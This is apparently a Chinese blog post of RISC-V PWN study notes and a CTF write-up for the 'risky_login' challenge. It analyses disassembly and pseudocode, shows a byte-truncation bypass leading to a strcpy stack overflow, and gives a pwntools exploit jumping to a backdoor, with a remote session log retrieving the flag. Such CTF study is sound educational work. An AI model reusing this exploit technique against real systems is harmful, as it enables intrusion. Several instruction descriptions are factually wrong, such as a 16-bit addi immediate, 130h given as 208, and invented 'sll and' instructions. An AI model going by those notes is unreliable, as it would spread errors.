lw（加载字）：\n功能：从内存中加载一个字（32位），并存储到目标寄存器中 注意：如果加载的对应地址的数据大于一个字（32位），就会造成数据丢失，是一个有漏洞的危险指令 语法：lw rd, rs1, imm rd：目标寄存器，存储加载的数据 rs1：源寄存器，用于计算内存地址 imm：立即数偏移量，与rs1相加得到内存地址 x8lw x8, x3, 16 # 从内存地址(x3+16)处加载一个字数据到x8 ld（加载双字）：\n功能：从内存中加载一个双字（64位），并存储到目标寄存器中 语法：ld rd, rs1, imm rd：目标寄存器，存储加载的数据 rs1：源寄存器，用于计算内存地址 imm：立即数偏移量，与rs1相加得到内存地址 ld x11, x6, -24 # 从内存地址(x6-24)处加载一个双字数据到x11 lbu（加载字节无符号整数）：\n功能：从内存中加载一个字节（8位）无符号整数，并进行零扩展后存储到目标寄存器中。 语法：lbu rd, rs1, imm rd：目标寄存器，存储加载的数据 rs1：源寄存器，用于计算内存地址 imm：立即数偏移量，与rs1相加得到内存地址 lbu x4, x7, 8 # 从内存地址(x7+8)处加载一个字节无符号整数到x4，并进行零扩展 逻辑与移位指令 # 逻辑与指令（and）：\nand x1, x2, x3 # 对x2和x3寄存器中的值进行逻辑与操作，结果保存在x1寄存器 逻辑或指令（or）：\nor x1, x2, x3 # 对x2和x3寄存器中的值进行逻辑或操作，结果保存在x1寄存器 或指令（xor）：\nxor x1, x2, x3 # 对x2和x3寄存器中的值进行异或操作（逻辑异或），结果保存在x1寄存器 逻辑与非指令（andn）：\nandn x1, x2, x3 # 对x2和x3寄存器中的值进行逻辑与非操作，结果保存在x1寄存器 逻辑或非指令（orn）：\norn x1, x2, x3 # 对x2和x3寄存器中的值进行逻辑或非操作，结果保存在x1寄存器 左移指令（sll）：\nsll x1, x2, x3 # 将寄存器x2的值左移x3位，结果保存在寄存器x1中 右移指令（srl）：\nsrl x1, x2, x3 # 将寄存器x2的值右移x3位（逻辑右移），结果保存在寄存器x1中 算术右移指令（sra）：\nsra x1, x2, x3 # 将寄存器x2的值右移x3位（算术右移），结果保存在寄存器x1中 左移扩展指令（slli）：\nslli x1, x2, 4 # 将寄存器x2的值左移4位，结果保存在寄存器x1中，同时补齐低位的0 右移扩展指令（srli）：\nsrli x1, x2, 4 # 将寄存器x2的值右移4位（逻辑右移），结果保存在寄存器x1中，同时补齐高位的 循环左移指令（rol）：\nrol x1, x2, x3 # 将x2寄存器中的值循环左移x3位，结果保存在x1寄存器 循环右移指令（ror）：\nror x1, x2, x3 # 将x2寄存器中的值循环右移x3位，结果保存在x1寄存器 移位左逻辑和指令（sll and）：\nsll and x1, x2, x3 # 对x2寄存器中的值左移x3位， # 然后与x1寄存器中的值进行逻辑与操作， # 结果保存在x1寄存器 移位右逻辑和指令（srl and）：\nsrl and x1, x2, x3 # 对x2寄存器中的值右移x3位， # 然后与x1寄存器中的值进行逻辑与操作， # 结果保存在x1寄存器 移位右算术和指令（sra and）：\nsra and x1, x2, x3 # 对x2寄存器中的值右移x3位（算术右移）， # 然后与x1寄存器中的值进行逻辑与操作， # 结果保存在x1寄存器 跳转指令（jal）：\njal x1, label # 跳转到标签为\u0026#34;label\u0026#34;的指令，并将返回地址保存在x1寄存器 jal x2, label2 # 跳转到标签为\u0026#34;label2\u0026#34;的指令，并将返回地址保存在x2寄存器 比较指令（slt）：\nslt x1, x2, x3 # 如果x2寄存器中的值小于x3寄存器中的值，则将x1寄存器置为1，否则置为0 slt x4, x5, x6 # 如果x5寄存器中的值小于x6寄存器中的值，则将x4寄存器置为1，否则置为0 条件分支指令 # 相等条件分支（beq）：\nbeq x1, x2, label # 如果x1和x2寄存器中的值相等，则跳转到标签为\u0026#34;label\u0026#34;的指令 不相等条件分支（bne）：\nbne x1, x2, label # 如果x1和x2寄存器中的值不相等，则跳转到标签为\u0026#34;label\u0026#34;的指令 小于条件分支（blt）：\nblt x1, x2, label # 如果x1寄存器中的值小于x2寄存器中的值，则跳转到标签为\u0026#34;label\u0026#34;的指令 小于等于条件分支（ble）：\nble x1, x2, label # 如果x1寄存器中的值小于等于x2寄存器中的值，则跳转到标签为\u0026#34;label\u0026#34;的指令 大于条件分支（bgt）：\nbgt x1, x2, label # 如果x1寄存器中的值 下表给出了一系列伪指令及其依赖的真实的处理器物理指令（这些伪指令都依赖于x0寄存器，从中可以看到x0寄存器的作用：\n下表是另外一些伪指令及其被汇编之后的物理指令：\n本题中出现的部分指令复习：\naddi sp, sp, -130h // 将栈指针 sp 加上 -130h字节，并将结果存储回sp中 sub rd, rs1, rs2 // 将寄存器rs2的值从寄存器rs1中减去，并将结果存储在目标寄存器rd中。 load rd, rs1, offset // 从rs1加上偏移量offset所得到的内存地址中加载数据，并将数据存储在目标寄存器rd中。 store rs1, rs2, offset // 将寄存器rs2中的数据存储到rs1加上偏移量offset所得到的内存地址中。 sd rs, offset(base) // base+offset = rs, 可以理解为\u0026#34;send\u0026#34; sd ra, 120h+var_s8(sp) // 将返回地址 ra 保存到栈帧中偏移为 120h+var_s8 的位置 jump jalr rd, offset(rs1) // 将当前程序地址存储在寄存器rd中，并无条件跳转到rs1加上偏移量offset所得到的地址中。 shift sll rd, rs1, rs2 // 将寄存器rs1的值左移rs2位，并将结果存储在目标寄存器rd中。 指令详解： # 先放几个，之后慢慢补（鸽）\naddi # addi 是RISC-V汇编指令中的一条整数加法指令，用于将一个立即数与源寄存器的值相加，并将结果存储到目标寄存器中。\n该指令的语法如下：\naddi rd, rs, immediate 其中，rd 是目标寄存器，用于保存运算结果；rs 是源寄存器，包含要参与加法运算的值；immediate 是一个 16 位立即数，表示要与 rs 寄存器的值相加的常数。\n具体的操作步骤如下：\n从源寄存器 rs 中获取要参与加法运算的值。 将立即数 immediate 进行有符号扩展，得到一个 32 位的常数。 将 rs 寄存器的值与常数相加。 将相加的结果存储到目标寄存器 rd 中。 需要注意的是，addi 指令执行加法操作时，没有进位产生，且不会修改条件码寄存器。此外，由于立即数是 16 位有符号数，因此其范围为 -32768 到 32767。如果加法结果溢出了这个范围，可能会导致错误的结果。\nsd # sd 是 RISC-V 汇编指令中的一条存储指令，用于将一个 64 位（8 字节）的值存储到内存中。\n该指令的语法如下：\nsd rs, offset(base) 其中，rs 是源寄存器，包含要写入内存的数据；offset 是基址寄存器 base 的偏移量，表示存储位置相对于 base 寄存器的位移。\n具体的操作步骤如下：\n从寄存器 rs 中获取要存储的 64 位数据。 计算存储位置的地址，通过将基址寄存器 base 中的值与偏移量 offset 相加得到。 将 64 位数据写入计算出的存储位置，即将数据存储到内存中。 需要注意的是，sd 指令要求存储位置的地址必须是 8 字节对齐的（地址是 8 的倍数），否则可能会导致运行时错误。\nli # 在 RISC-V 汇编中，li 并不是一条单独的指令，而是一种伪指令（pseudo-instruction）。li是一个常用的伪指令，它被用来加载一个立即数到寄存器中。由于RISC-V指令集的设计，无法直接将一个立即数加载到一个寄存器中。\u0026ldquo;li\u0026quot;指令会被汇编器转化为一系列指令来实现加载立即数的功能。\n以下是一个常见的用法：\nli rd, imm rd为目标寄存器，用于存储立即数。 imm为要加载的立即数。 一般来说，\u0026ldquo;li\u0026quot;指令会被转化为以下两条指令来实现立即数加载：\nlui rd, upper addi rd, rd, lower lui指令将常数的高位部分放入目标寄存器rd中。 addi指令将常数的低位部分与目标寄存器rd相加，并将结果存回目标寄存器rd中。 举例来说，如果要将立即数123加载到寄存器x5中，可以使用以下指令序列来实现：\nlui x5, %hi(123) addi x5, x5, %lo(123) 其中，%hi(123)表示获取123的高位部分，%lo(123)表示获取123的低位部分。\n请注意，\u0026ldquo;li\u0026quot;指令是一个伪指令，由汇编器在编译时转化为真正的指令，所以在实际的RISC-V汇编语言中，我们不会直接使用\u0026quot;li\u0026quot;指令。\n如何调试riscv64程序 # 安装qemu # # 先把对应的库下载好: sudo apt install libc6-riscv64-cross sudo apt install binutils-riscv64-linux-gnu sudo apt install gcc-riscv64-linux-gnu sudo apt install binutils-riscv64-unknown-elf sudo apt install gcc-riscv64-unknown-elf sudo apt install qemu-system-misc sudo apt install qemu-user # 运行一下： qemu-riscv64 pwn # 如果出现以下报错： qemu-riscv64: could not open \u0026#39;\u0026#39;/lib/ld-linux-riscv64-lp64d.so.1\u0026#39; #说明我们文件下载的地方和查找的地方不一样，只要把文件cp一下就可以了 sudo cp /usr/riscv64-linux-gnu/lib/* /lib/ 安装gdb-multiarch # # 安装 sudo apt-get install gdb-multiarch # 检测 gdb-multiarch -v 题目分析 # main函数汇编分析 # 如何在纯汇编下找到main函数呢？\n点进程序的入口函数——start函数，我们可以看到他调用了一个函数\n.text:0000000012345606 17 05 00 00 13 05 45 1E la a0, sub_123457EA 右键或快捷键\u0026quot;n\u0026quot;重命名为 main：\n题目中的main的汇编代码如下：（copy自IDA）\n# 原来是sub_123457EA函数，重命名为main函数 .text:00000000123457EA .text:00000000123457EA # int __cdecl main(int argc, const char **argv, const char **envp) .text:00000000123457EA main: # DATA XREF: start+6↑o .text:00000000123457EA .text:00000000123457EA var_s0= 0 .text:00000000123457EA var_s8= 8 .text:00000000123457EA arg_0= 10h .text:00000000123457EA .text:00000000123457EA 69 71 addi sp, sp, -130h .text:00000000123457EC 06 F6 sd ra, 120h+var_s8(sp) .text:00000000123457EE 22 F2 sd s0, 120h+var_s0(sp) .text:00000000123457F0 00 1A addi s0, sp, 120h+arg_0 .text:00000000123457F2 EF F0 FF EA jal sub_123456A0 .text:00000000123457F2 .text:00000000123457F6 B7 67 34 12 lui a5, 12346h .text:00000000123457FA 13 85 07 8F addi a0, a5, -710h .text:00000000123457FE 97 B0 CC ED E7 80 20 FA call puts .text:00000000123457FE .text:0000000012345806 B7 67 34 12 lui a5, 12346h .text:000000001234580A 13 85 87 90 addi a0, a5, -6F8h .text:000000001234580E 97 B0 CC ED E7 80 20 F9 call puts .text:000000001234580E .text:0000000012345816 21 46 li a2, 8 .text:0000000012345818 93 85 81 87 la a1, unk_12347078 .text:000000001234581C 01 45 li a0, 0 .text:000000001234581E 97 B0 CC ED E7 80 20 F6 call read .text:000000001234581E .text:0000000012345826 93 85 81 87 la a1, unk_12347078 .text:000000001234582A B7 67 34 12 lui a5, 12346h .text:000000001234582E 13 85 87 91 addi a0, a5, -6E8h .text:0000000012345832 97 B0 CC ED E7 80 E0 F9 call printf .text:0000000012345832 .text:000000001234583A B7 67 34 12 lui a5, 12346h .text:000000001234583E 13 85 87 92 addi a0, a5, -6D8h .text:0000000012345842 97 B0 CC ED E7 80 E0 F5 call puts .text:0000000012345842 .text:000000001234584A 93 07 04 ED addi a5, s0, -130h .text:000000001234584E 13 06 00 12 li a2, 120h .text:0000000012345852 BE 85 mv a1, a5 .text:0000000012345854 01 45 li a0, 0 .text:0000000012345856 97 B0 CC ED E7 80 A0 F2 call read .text:0000000012345856 .text:000000001234585E 93 07 04 ED addi a5, s0, -130h .text:0000000012345862 3E 85 mv a0, a5 .text:0000000012345864 EF F0 3F F2 jal vuln .text:0000000012345864 .text:0000000012345868 B7 67 34 12 lui a5, 12346h .text:000000001234586C 13 85 87 93 addi a0, a5, -6C8h .text:0000000012345870 97 B0 CC ED E7 80 00 F3 call puts .text:0000000012345870 .text:0000000012345878 81 47 li a5, 0 .text:000000001234587A 3E 85 mv a0, a5 .text:000000001234587C B2 70 ld ra, 120h+var_s8(sp) .text:000000001234587E 12 74 ld s0, 120h+var_s0(sp) .text:0000000012345880 55 61 addi sp, sp, 130h .text:0000000012345882 82 80 ret .text:0000000012345882 .text:0000000012345882 # End of function main 对每行代码的简要分析：\naddi sp, sp, -130h：将栈指针 sp 减少 130h（表示208）字节，为栈帧分配空间。\nsd ra, 120h+var_s8(sp)：将返回地址 ra 保存到栈帧中偏移为 120h+var_s8 的位置。\nsd s0, 120h+var_s0(sp)：将寄存器 s0 保存到栈帧中偏移为 120h+var_s0 的位置。\naddi s0, sp, 120h+arg_0：计算参数 arg_0 在栈帧中的地址，并将结果存入寄存器 s0。\njal sub_123456A0：无条件跳转到子函数 sub_123456A0 执行，并将返回地址保存到寄存器 ra\n跳转到了一个新的函数 嗯，让我们继续转到main函数的汇编进行分析 lui a5, 12346h：将常数 12346h 的高 20 位加载到寄存器 a5。\naddi a0, a5, -710h：将寄存器 a5 减去 710h 并将结果存入寄存器 a0。\n通过计算得知a0寄存器的值为0x123458F0 在IDA中查找地址0x123458F0可以看到是一个字符串，当然在分析汇编语言之前我们就已经shift+F12知道了有哪些字符串了（对吧师傅们） call puts：调用函数 puts，将参数传递给它\nputs(\u0026#34;RiskY LoG1N SySTem\u0026#34;); addi a0, a5, -6F8h：类似于上述步骤，将寄存器 a5 减去 6F8h 并将结果存入寄存器 a0。\ncall puts：再次调用函数 puts\nputs(\u0026#34;Input ur name:\u0026#34;) li a2, 8：将常数 8 加载到寄存器 a2。\nla a1, unk_12347078：将未知地址 unk_12347078 加载到寄存器 a1。\nli a0, 0：将常数 0 加载到寄存器 a0。\ncall read：调用函数 read，读取输入并将结果存储在指定位置。\nla a1, unk_12347078：类似于步骤 12，将未知地址 unk_12347078 加载到寄存器 a1\nread(0,\u0026amp;unk_12347078,8); addi a0, a5, -6E8h：类似于步骤 9，将寄存器 a5 减去 6E8h 并将结果存入寄存器 a0。\ncall printf：调用函数 printf，并传递参数\nprintf(\u0026#34;Hello, %s\u0026#34;,\u0026amp;unk_12347078); lui a5, 12346h：类似于步骤 6，将常数 12346h 的高 20 位加载到寄存器 a5。\naddi a0, a5, -6D8h：类似于步骤 9，将寄存器 a5 减去 6D8h 并将结果存入寄存器 a0。\ncall puts：再次调用函数 puts\nputs(\u0026#34;Input ur words\u0026#34;); addi a5, s0, -130h：计算栈帧中变量 s0 的地址，加上 -130h 并将结果保存到寄存器 a5。\nli a2, 120h：将常数 120h 加载到寄存器 a2\n第三个参数为0x120 mv a1, a5：将寄存器 a5 的值移动到寄存器 a1\n第二个参数为栈上的地址： auStack-130（随便写的，知道在栈上就OK了） li a0, 0：将常数 0 加载到寄存器 a0\n第一个参数为0 call read：再次调用函数 read，读取输入并将结果存储在指定位置\nread(0,auStack_130,0x120) addi a5, s0, -130h：类似于步骤 21，计算栈帧中变量 s0 的地址，并将结果保存到寄存器 a5。\nmv a0, a5：将寄存器 a5 的值移动到寄存器 a0。\njal vuln：调用函数 vuln\n跳转到了一个新的函数！ 即重名前的 sub_12345786 函数 有调用puts函数和危险函数strcpy，看起来应该是一个有用的函数，mark一下，重命名为vuln，待会回来 lui a5, 12346h：类似于步骤 6，将常数 12346h 的高 20 位加载到寄存器 a5。\naddi a0, a5, -6C8h：类似于步骤 9，将寄存器 a5 减去 6C8h 并将结果存入寄存器 a0。\ncall puts：再次调用函数 puts。\nli a5, 0：将常数 0 加载到寄存器 a5。\nmv a0, a5：将寄存器 a5 的值移动到寄存器 a0。\nld ra, 120h+var_s8(sp)：将栈帧中偏移为 120h+var_s8 的位置的值加载到寄存器 ra。\nld s0, 120h+var_s0(sp)：将栈帧中偏移为 120h+var_s0 的位置的值加载到寄存器 s0。\naddi sp, sp, 130h：将栈指针 sp 增加 130h（表示208）字节，释放栈帧空间。\nret：与X86的ret指令一样，pop rip，使函数执行栈中下一个地址所指向的代码\nend 结束对main函数的汇编分析\n其实我们不需要从头到尾都分析完，本题可以通过字符串的内容猜到漏洞点所在的函数vuln的地址以及后面函数的地址 不过刚开始接触RISC-V架构的题目多看看汇编代码也是好的~ （其实是我自己想读一读汇编代码，所以做一下记录） 后面的vuln函数和后门函数的汇编代码就不这么仔细的分析了，直接贴汇编代码永伪代码分析好了（） 补一个Ghidra反编译的伪代码：\nundefined8 main(void) { undefined auStack_130 [288]; gp = \u0026amp;__global_pointer$; FUN_123456a0(); puts(\u0026#34;RiskY LoG1N SySTem\u0026#34;); puts(\u0026#34;Input ur name:\u0026#34;); read(0,\u0026amp;DAT_12347078,8); printf(\u0026#34;Hello, %s\u0026#34;); puts(\u0026#34;Input ur words\u0026#34;); read(0,auStack_130,0x120); vuln(auStack_130); puts(\u0026#34;message received\u0026#34;); return 0; } vuln函数分析 # 先贴个汇编代码：\n# 原来是sub_12345786函数，重命名为vuln函数 .text:0000000012345786 vuln: # CODE XREF: main+7A↓p .text:0000000012345786 .text:0000000012345786 var_s0= 0 .text:0000000012345786 var_s8= 8 .text:0000000012345786 arg_0= 10h .text:0000000012345786 .text:0000000012345786 2D 71 addi sp, sp, -120h .text:0000000012345788 06 EE sd ra, 110h+var_s8(sp) .text:000000001234578A 22 EA sd s0, 110h+var_s0(sp) .text:000000001234578C 00 12 addi s0, sp, 110h+arg_0 .text:000000001234578E 23 34 A4 EE sd a0, -118h(s0) .text:0000000012345792 03 35 84 EE ld a0, -118h(s0) .text:0000000012345796 97 B0 CC ED E7 80 A0 FD call strlen .text:0000000012345796 .text:000000001234579E AA 87 mv a5, a0 .text:00000000123457A0 13 F7 F7 0F andi a4, a5, 0FFh .text:00000000123457A4 23 88 E1 86 sb a4, byte_12347070 .text:00000000123457A8 83 C7 01 87 lbu a5, byte_12347070 .text:00000000123457AC 3E 87 mv a4, a5 .text:00000000123457AE A1 47 li a5, 8 .text:00000000123457B0 63 FF E7 00 bgeu a5, a4, loc_123457CE .text:00000000123457B0 .text:00000000123457B4 B7 67 34 12 lui a5, 12346h .text:00000000123457B8 13 85 07 8E addi a0, a5, -720h .text:00000000123457BC 97 B0 CC ED E7 80 40 FE call puts .text:00000000123457BC .text:00000000123457C4 7D 55 li a0, -1 .text:00000000123457C6 97 B0 CC ED E7 80 A0 FF call exit .text:00000000123457C6 .text:00000000123457CE # --------------------------------------------------------------------------- .text:00000000123457CE .text:00000000123457CE loc_123457CE: # CODE XREF: vuln+2A↑j .text:00000000123457CE 93 07 84 EF addi a5, s0, -108h .text:00000000123457D2 83 35 84 EE ld a1, -118h(s0) .text:00000000123457D6 3E 85 mv a0, a5 .text:00000000123457D8 97 B0 CC ED E7 80 80 FB call strcpy .text:00000000123457D8 .text:00000000123457E0 01 00 nop .text:00000000123457E2 F2 60 ld ra, 110h+var_s8(sp) .text:00000000123457E4 52 64 ld s0, 110h+var_s0(sp) .text:00000000123457E6 15 61 addi sp, sp, 120h .text:00000000123457E8 82 80 ret .text:00000000123457E8 .text:00000000123457E8 # End of function vuln 伪代码及简要分析：\nvoid vuln(char *param_1) { size_t sVar1; char acStack_108 [248]; //大小为0xF8 = 0x100-0x8 gp = \u0026amp;__global_pointer$; sVar1 = strlen(param_1); DAT_12347070 = (byte)sVar1; if (8 \u0026lt; DAT_12347070) // 一个检测，需要绕过 { puts(\u0026#34;too long.\u0026#34;); /* WARNING: Subroutine does not return */ /* 子程序没有返回的警告，可以不用管 */ exit(-1); } strcpy(acStack_108,param_1); // 危险函数strcpy，如果param_1大于0x100就会造成栈溢出 return; } 在main 函数中我们可以向 auStack_130 写入大小为 0x120 的数据， 在 vuln 函数中只要我们绕过检测，就可以将将 auStack_130 中内容复制到 acStack_108 位置， 而 acStack_108 大小只有0xF8，故可以栈溢出， 栈溢出时将返回地址覆盖为后门函数的地址，就可以getshell了 如何绕过检测？\n我们先来看看这个分支函数的汇编代码：\n# IDA中的汇编代码 .text:000000001234579E AA 87 mv a5, a0 .text:00000000123457A0 13 F7 F7 0F andi a4, a5, 0FFh .text:00000000123457A4 23 88 E1 86 sb a4, byte_12347070 .text:00000000123457A8 83 C7 01 87 lbu a5, byte_12347070 .text:00000000123457AC 3E 87 mv a4, a5 .text:00000000123457AE A1 47 li a5, 8 .text:00000000123457B0 63 FF E7 00 bgeu a5, a4, loc_123457CE # Ghidra中的汇编代码 1234579e aa 87 c.mv a5,a0 123457a0 13 f7 f7 0f andi a4,a5,0xff 123457a4 23 88 e1 86 sb a4,-0x790 (gp=\u0026gt;DAT_12347070 ) = ?? 123457a8 83 c7 01 87 lbu a5,-0x790 (gp=\u0026gt;DAT_12347070 ) = ?? 123457ac 3e 87 c.mv a4,a5 123457ae a1 47 c.li a5,0x8 123457b0 63 ff e7 00 bgeu a5,a4,LAB_123457ce # Ghidra 中的c.mv指令及我们上面学到的mv指令, c.li指令同理 我们可以看到，程序比较的时候是先通过mv a5, a0指令将我们的strlen函数的返回值转存至r5寄存器\n再通过指令andi a4, a5, 0FFh将我们的字符串长度的值与立即数0xFF进行按位与\n只保留最低的 8 位，并将结果存储到 a4 这里就已发生了数据丢失了 sb指令将寄存器 a4 中的数据存储到内存地址 byte_12347070 处\n只是将 a4 的最低有效字节（8 位）存储到给定的内存地址 lbu指令将 byte_12347070 地址处的字节数据加载到寄存器 a5 中\n由于使用 lbu 指令，加载的字节数据会进行零扩展，即高位会填充零 故伪代码为 DAT_12347070 = (byte)sVar1;\nbyte 类型的 DAT_1234797 的数值只有8 位 汇编代码bgeu a5,a4,LAB_123457ce 即 伪代码if (8 \u0026lt; DAT_12347070)\nparam_1 即我们之前输入的数据 auStack_130 的长度最大为 9 位\n（0x120 = 0b 0001 0010 0000） 要想绕过检测，长度的后8位必须小于等于 0b 0000 1000\n同时，acStack_108的大小为0x100-0x8，所以我们的填充字符padding为0x100-0x8+0x8（覆盖帧指针寄存器）\nstrcpy(acStack_108,param_1); // 危险函数strcpy，如果param_1大于0x100就会造成栈溢出 在加上我们要覆盖返回地址的0x08大小的数据，总的payload长度为0x108\n二进制码为0b 1 0000 1000 后8位刚好等于0x8，成功绕过 如果不刚好的话我们也可以试试看覆盖返回地址能否只发送0x6位的数据，有时甚至可以只发送0x1位的数据，这些都是十分灵活的 所以，我们的payload = b\u0026quot;a\u0026quot; * 0x100 + p64(backdoor_addr)\noffset = 0x100 padding = b\u0026quot;a\u0026rdquo; * offset 后门函数分析 # # 后门函数在IDA中不会显示为函数（可能是因为没有别的函数调用它）， # 但是在Ghidra中会把它显示为FUN_123456ee函数，所以两个软件一起用还是非常nice的 .text:00000000123456EE # --------------------------------------------------------------------------- .text:00000000123456EE 41 11 addi sp, sp, -10h .text:00000000123456F0 06 E4 sd ra, 8(sp) .text:00000000123456F2 22 E0 sd s0, 0(sp) .text:00000000123456F4 00 08 addi s0, sp, 10h .text:00000000123456F6 B7 67 34 12 lui a5, 12346h .text:00000000123456FA 13 85 07 89 addi a0, a5, -770h .text:00000000123456FE 97 B0 CC ED E7 80 20 0A call puts .text:00000000123456FE .text:0000000012345706 B7 67 34 12 lui a5, 12346h .text:000000001234570A 13 85 87 8A addi a0, a5, -758h .text:000000001234570E 97 B0 CC ED E7 80 20 09 call puts .text:000000001234570E .text:0000000012345716 21 46 li a2, 8 .text:0000000012345718 93 85 81 87 la a1, unk_12347078 .text:000000001234571C 01 45 li a0, 0 .text:000000001234571E 97 B0 CC ED E7 80 20 06 call read .text:000000001234571E .text:0000000012345726 B7 67 34 12 lui a5, 12346h .text:000000001234572A 93 85 87 8C addi a1, a5, -738h .text:000000001234572E 13 85 81 87 la a0, unk_12347078 .text:0000000012345732 97 B0 CC ED E7 80 E0 07 call strstr .text:0000000012345732 .text:000000001234573A AA 87 mv a5, a0 .text:000000001234573C 89 EF bnez a5, loc_12345756 .text:000000001234573C .text:000000001234573E B7 67 34 12 lui a5, 12346h .text:0000000012345742 93 85 07 8D addi a1, a5, -730h .text:0000000012345746 13 85 81 87 la a0, unk_12347078 .text:000000001234574A 97 B0 CC ED E7 80 60 06 call strstr .text:000000001234574A .text:0000000012345752 AA 87 mv a5, a0 .text:0000000012345754 91 CF beqz a5, loc_12345770 .text:0000000012345754 .text:0000000012345756 .text:0000000012345756 loc_12345756: # CODE XREF: .text:000000001234573C↑j .text:0000000012345756 B7 67 34 12 lui a5, 12346h .text:000000001234575A 13 85 87 8D addi a0, a5, -728h .text:000000001234575E 97 B0 CC ED E7 80 20 04 call puts .text:000000001234575E .text:0000000012345766 7D 55 li a0, -1 .text:0000000012345768 97 B0 CC ED E7 80 80 05 call exit .text:0000000012345768 .text:0000000012345770 # --------------------------------------------------------------------------- .text:0000000012345770 .text:0000000012345770 loc_12345770: # CODE XREF: .text:0000000012345754↑j .text:0000000012345770 13 85 81 87 la a0, unk_12347078 .text:0000000012345774 97 B0 CC ED E7 80 C0 FE call system .text:0000000012345774 .text:000000001234577C 01 00 nop .text:000000001234577E A2 60 ld ra, 8(sp) .text:0000000012345780 02 64 ld s0, 0(sp) .text:0000000012345782 41 01 addi sp, sp, 10h .text:0000000012345784 82 80 ret 伪代码及简要分析：\nvoid backdoor(void) { char *pcVar1; gp = \u0026amp;__global_pointer$; puts(\u0026#34;background debug fun.\u0026#34;); puts(\u0026#34;input what you want exec\u0026#34;); read(0,\u0026amp;DAT_12347078,8); pcVar1 = strstr(\u0026amp;DAT_12347078,\u0026#34;sh\u0026#34;); if ((pcVar1 == (char *)0x0) \u0026amp;\u0026amp; (pcVar1 = strstr(\u0026amp;DAT_12347078,\u0026#34;flag\u0026#34;), pcVar1 == (char *)0x0)) { system(\u0026amp;DAT_12347078); return; } puts(\u0026#34;no.\u0026#34;); /* WARNING: Subroutine does not return */ exit(-1); } 一个小绕过：\nif ((pcVar1 == (char *)0x0) \u0026amp;\u0026amp; (pcVar1 = strstr(\u0026amp;DAT_12347078,\u0026quot;flag\u0026quot;), pcVar1 == (char *)0x0))\n即我们发送的要执行的命令不能带\u0026quot;flag\u0026rdquo; 而我们ls命令查看到当前目录下就有一个flag文件，所以我们需要在不出现\u0026quot;flag\u0026quot;的情况下执行类似cat flag的命令 采用正则表达式即可绕过，用f*来代表flag cat f* wp # 可以明显的看出来程序存在栈溢出漏洞，而且程序还有一个后门函数，exp如下：\nfrom pwn import * context.update(arch=\u0026#34;riscv\u0026#34;, os=\u0026#34;linux\u0026#34;) context.log_level = \u0026#39;debug\u0026#39; taolve = process(\u0026#34;./pwn\u0026#34;) # taolve = process([\u0026#34;qemu-riscv64\u0026#34;, \u0026#34;-L\u0026#34;, \u0026#34;~/桌面/CTF/ycb2023/pwn1/login\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;1234\u0026#34;, \u0026#34;./pwn\u0026#34;]) # taolve = remote(\u0026#39;tcp.cloud.dasctf.com\u0026#39;, 23149) offset = 0x100 backdoor = 0x123456ee payload = b\u0026#34;a\u0026#34;*offset + p64(backdoor) taolve.sendlineafter(b\u0026#39;name:\u0026#39;, b\u0026#39;aaa\u0026#39;) taolve.sendafter(b\u0026#39;words\u0026#39;, payload) taolve.interactive() # 最后绕过一个flag字符串的检测 # 直接cat f*就可以了 # DASCTF{49263227130109070012252996328021} 其实题目不难，如果用Ghidra转为伪代码就只是一道简单的栈溢出题目，但可以趁这个机会好好学习RSIC-V架构的指令集以及练习一下阅读汇编代码的能力\nLinux终端 log 日志：\nta0lve@ta0lve:~/桌面/CTF/ycb2023/pwn1$ python3 exp.py [+] Opening connection to tcp.cloud.dasctf.com on port 23149: Done [DEBUG] Received 0x22 bytes: b\u0026#39;RiskY LoG1N SySTem\\n\u0026#39; b\u0026#39;Input ur name:\\n\u0026#39; [DEBUG] Sent 0x4 bytes: b\u0026#39;aaa\\n\u0026#39; [DEBUG] Received 0x1a bytes: b\u0026#39;Hello, aaa\\n\u0026#39; b\u0026#39;Input ur words\\n\u0026#39; [DEBUG] Sent 0x108 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ * 00000100 ee 56 34 12 00 00 00 00 │·V4·│····│ 00000108 [*] Switching to interactive mode [DEBUG] Received 0x15 bytes: b\u0026#39;background debug fun.\u0026#39; background debug fun.[DEBUG] Received 0x1a bytes: b\u0026#39;\\n\u0026#39; b\u0026#39;input what you want exec\\n\u0026#39; input what you want exec $ ls [DEBUG] Sent 0x3 bytes: b\u0026#39;ls\\n\u0026#39; [DEBUG] Received 0x41 bytes: b\u0026#39;bin\\n\u0026#39; b\u0026#39;dev\\n\u0026#39; b\u0026#39;flag\\n\u0026#39; b\u0026#39;lib\\n\u0026#39; b\u0026#39;lib32\\n\u0026#39; b\u0026#39;lib64\\n\u0026#39; b\u0026#39;libexec\\n\u0026#39; b\u0026#39;libx32\\n\u0026#39; b\u0026#39;pwn\\n\u0026#39; b\u0026#39;qemu-riscv64\\n\u0026#39; b\u0026#39;usr\\n\u0026#39; bin dev flag lib lib32 lib64 libexec libx32 pwn qemu-riscv64 usr [DEBUG] Received 0x2f bytes: b\u0026#39;background debug fun.\\n\u0026#39; b\u0026#39;input what you want exec\\n\u0026#39; background debug fun. input what you want exec $ cat f* [DEBUG] Sent 0x7 bytes: b\u0026#39;cat f*\\n\u0026#39; [DEBUG] Received 0x58 bytes: b\u0026#39;DASCTF{49263227130109070012252996328021}\\n\u0026#39; b\u0026#39;background debug fun.\\n\u0026#39; b\u0026#39;input what you want exec\\n\u0026#39; DASCTF{49263227130109070012252996328021} background debug fun. input what you want exec $ 附录 # 学习与参考链接：\nqemu-riscv64: could not open ‘/lib/ld-linux-riscv64-lp64d.so.1‘解决方法\n补码/反码、零扩展和符号位扩展（Zero extension and Sign extension）\nRISC-V 指令概况 - 计算机组成原理（2021年） (tsinghua.edu.cn)\nRISC-V 手册 - 中国科学技术大学 （点击直接下载PDF文件）\n","date":"September 3, 2023","permalink":"/posts/pwn/risc-v/0x01/","section":"Posts","summary":"\u003cp\u003e本文是一篇RISC-V PWN的学习记录，同时也是\u003cstrong\u003e羊城杯2023 risky_login\u003c/strong\u003e一题的wp.\u003c/p\u003e","title":"RISC-V PWN学习"},{"content":"","date":"September 3, 2023","permalink":"/tags/riscv64/","section":"Tags","summary":"","title":"riscv64"},{"content":"","date":"September 3, 2023","permalink":"/series/%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"Series","summary":"","title":"其他架构PWN学习记录"},{"content":"","date":"September 3, 